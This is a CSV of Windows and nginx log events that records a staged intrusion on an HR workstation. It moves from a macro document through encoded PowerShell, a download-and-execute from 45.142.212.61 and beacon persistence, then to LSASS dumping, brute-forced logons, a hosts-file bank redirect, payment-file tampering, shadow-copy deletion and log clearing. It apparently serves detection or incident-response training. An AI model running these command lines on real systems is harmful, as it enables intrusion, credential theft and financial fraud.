@timestamp,host.name,user.name,winlog.channel,event.code,process.name,process.parent.name,process.command_line,source.ip,destination.ip,winlog.event_data.TargetUserName,message
2026-10-05T09:01:12Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,WINWORD.EXE,explorer.exe,"C:\Program Files\Microsoft Office\WINWORD.EXE /n rezyume.docm",,,,"Office document opened from email attachment"
2026-10-05T09:01:44Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,powershell.exe,WINWORD.EXE,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",,,,"macro spawned powershell encoded"
2026-10-05T09:01:59Z,HR-PC01,hr.olim,Microsoft-Windows-PowerShell/Operational,4104,powershell.exe,,"IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1')",,,,"scriptblock logging"
2026-10-05T09:02:20Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,certutil.exe,powershell.exe,"certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\Users\hr.olim\AppData\Local\Temp\beacon.exe",,,,"download tool"
2026-10-05T09:02:35Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,3,beacon.exe,powershell.exe,"beacon.exe",10.10.20.51,45.142.212.61,,"network connection to C2"
2026-10-05T09:05:00Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,3,beacon.exe,,"beacon.exe",10.10.20.51,45.142.212.61,,"beacon check-in"
2026-10-05T09:10:00Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,3,beacon.exe,,"beacon.exe",10.10.20.51,45.142.212.61,,"beacon check-in"
2026-10-05T09:15:00Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,3,beacon.exe,,"beacon.exe",10.10.20.51,45.142.212.61,,"beacon check-in"
2026-10-05T09:20:00Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,3,beacon.exe,,"beacon.exe",10.10.20.51,45.142.212.61,,"beacon check-in"
2026-10-05T09:07:10Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,schtasks.exe,beacon.exe,"schtasks /create /sc onlogon /tn Updater /tr C:\Users\hr.olim\AppData\Local\Temp\beacon.exe",,,,"persistence scheduled task"
2026-10-05T09:07:40Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,13,reg.exe,beacon.exe,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\hr.olim\AppData\Local\Temp\beacon.exe /f",,,,"run key persistence"
2026-10-05T09:12:03Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,net.exe,beacon.exe,"net view /domain",,,,"discovery"
2026-10-05T09:12:20Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,nltest.exe,beacon.exe,"nltest /dclist:corp.local",,,,"domain controller discovery"
2026-10-05T09:12:41Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,1,net.exe,beacon.exe,"net group ""Domain Admins"" /domain",,,,"privileged account discovery"
2026-10-05T09:14:05Z,HR-PC01,hr.olim,Microsoft-Windows-Sysmon/Operational,10,lsass.exe,beacon.exe,"C:\Windows\System32\rundll32.exe comsvcs.dll, MiniDump 720 C:\Windows\Temp\lsass.dmp full",,,,"lsass memory access"
2026-10-05T09:20:11Z,DC01,SYSTEM,Security,4625,,,"",10.10.20.51,,bux.aziza,"failed logon"
2026-10-05T09:20:22Z,DC01,SYSTEM,Security,4625,,,"",10.10.20.51,,bux.aziza,"failed logon"
2026-10-05T09:20:33Z,DC01,SYSTEM,Security,4625,,,"",10.10.20.51,,bux.aziza,"failed logon"
2026-10-05T09:20:44Z,DC01,SYSTEM,Security,4625,,,"",10.10.20.51,,bux.aziza,"failed logon"
2026-10-05T09:20:55Z,DC01,SYSTEM,Security,4625,,,"",10.10.20.51,,bux.aziza,"failed logon"
2026-10-05T09:21:06Z,DC01,SYSTEM,Security,4625,,,"",10.10.20.51,,bux.aziza,"failed logon"
2026-10-05T09:21:30Z,DC01,SYSTEM,Security,4624,,,"",10.10.20.51,,bux.aziza,"successful logon type 3"
2026-10-05T09:23:00Z,BUX-PC05,bux.aziza,Security,4624,,,"",10.10.20.51,,bux.aziza,"logon type 10 RDP"
2026-10-05T09:25:14Z,BUX-PC05,bux.aziza,Microsoft-Windows-Sysmon/Operational,1,AnyDesk.exe,explorer.exe,"AnyDesk.exe --silent --start-service",,,,"remote access tool install"
2026-10-05T09:28:40Z,BUX-PC05,bux.aziza,Microsoft-Windows-Sysmon/Operational,11,cmd.exe,beacon.exe,"cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C:\Windows\System32\drivers\etc\hosts",,,,"hosts file modification bank redirect"
2026-10-05T09:31:02Z,BUX-PC05,bux.aziza,Microsoft-Windows-Sysmon/Operational,1,1cv8.exe,explorer.exe,"1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited",,,,"1C payment file manipulation"
2026-10-05T09:35:50Z,BUX-PC05,bux.aziza,Microsoft-Windows-Sysmon/Operational,1,vssadmin.exe,beacon.exe,"vssadmin delete shadows /all /quiet",,,,"inhibit recovery"
2026-10-05T09:36:20Z,BUX-PC05,bux.aziza,Security,1102,,,"",,,,"the audit log was cleared"
2026-10-05T08:59:00Z,GW-CHECK,checker,nginx,access,,,"GET /health",172.16.9.9,10.10.20.60,,"GET /health 200"
2026-10-05T09:04:00Z,GW-CHECK,checker,nginx,access,,,"GET /health",172.16.9.9,10.10.20.60,,"GET /health 200"
2026-10-05T09:09:00Z,GW-CHECK,checker,nginx,access,,,"GET /health",172.16.9.9,10.10.20.60,,"GET /health 200"
2026-10-05T09:14:00Z,GW-CHECK,checker,nginx,access,,,"GET /health",172.16.9.9,10.10.20.60,,"GET /health 200"
2026-10-05T09:19:00Z,GW-CHECK,checker,nginx,access,,,"GET /health",172.16.9.9,10.10.20.60,,"GET /health 200"
